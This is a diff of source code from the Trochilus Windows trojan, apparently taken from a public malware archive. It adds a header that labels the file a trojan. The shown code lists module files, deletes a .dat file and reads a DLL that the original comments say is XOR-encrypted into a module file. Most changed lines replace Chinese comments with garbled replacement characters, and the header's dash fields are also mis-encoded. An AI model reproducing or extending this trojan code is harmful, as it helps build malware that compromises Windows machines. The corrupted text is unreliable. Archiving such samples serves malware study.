@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "file/MyFile.h"
 #include "BinNames.h"
@@ -55,7 +66,7 @@ void ClientmodManager::ListAllModuleNames( TStringVector& modnameList )
 
 void ClientmodManager::EnumModules( ModuleInfoMap& miMap ) const
 {
-	//±éÀúÄ£¿éÄ¿Â¼£¬¼ÇÂ¼datºÍdllµÄÊ±¼ä
+	//ï¿½ï¿½ï¿½ï¿½Ä£ï¿½ï¿½Ä¿Â¼ï¿½ï¿½ï¿½ï¿½Â¼datï¿½ï¿½dllï¿½ï¿½Ê±ï¿½ï¿½
 	tstring findstr = m_modDirpath;
 	findstr += _T("*");
 
@@ -108,7 +119,7 @@ void ClientmodManager::CheckModules( ModuleInfoMap& miMap ) const
 		const tstring& modname = iter->first;
 		const MODULE_INFO& info = iter->second;
 
-		//Èç¹ûdll±È½ÏÐÂ£¬ÔòÖØÐÂÖÆ×÷datÎÄ¼þ
+		//ï¿½ï¿½ï¿½dllï¿½È½ï¿½ï¿½Â£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½datï¿½Ä¼ï¿½
 		if (info.dllLastWriteTime.QuadPart > info.datLastWriteTime.QuadPart)
 		{
 			if (! FormatModule(modname.c_str()))
@@ -131,10 +142,10 @@ BOOL ClientmodManager::FormatModule( LPCTSTR modname ) const
 	datfilepath += modname;
 	datfilepath += ENCRYPTED_MODULE_POSTFIX;
 
-	//É¾³ýdatÎÄ¼þ
+	//É¾ï¿½ï¿½datï¿½Ä¼ï¿½
 	::DeleteFile(datfilepath.c_str());
 
-	//¶ÁÈ¡dllÎÄ¼þÄÚÈÝ£¬²¢Òì»ò¼ÓÃÜ
+	//ï¿½ï¿½È¡dllï¿½Ä¼ï¿½ï¿½ï¿½ï¿½Ý£ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	MyFile dllFile;
 	if (! dllFile.Open(dllfilepath.c_str(), GENERIC_READ, OPEN_EXISTING, FILE_SHARE_READ))
 	{
@@ -155,7 +166,7 @@ BOOL ClientmodManager::FormatModule( LPCTSTR modname ) const
 		return FALSE;
 	}
 
-	//´´½¨datÎÄ¼þ£¬²¢Ð´Èë
+	//ï¿½ï¿½ï¿½ï¿½datï¿½Ä¼ï¿½ï¿½ï¿½ï¿½ï¿½Ð´ï¿½ï¿½
 	MyFile datFile;
 	if (! datFile.Open(datfilepath.c_str(), GENERIC_ALL, CREATE_ALWAYS, 0))
 	{
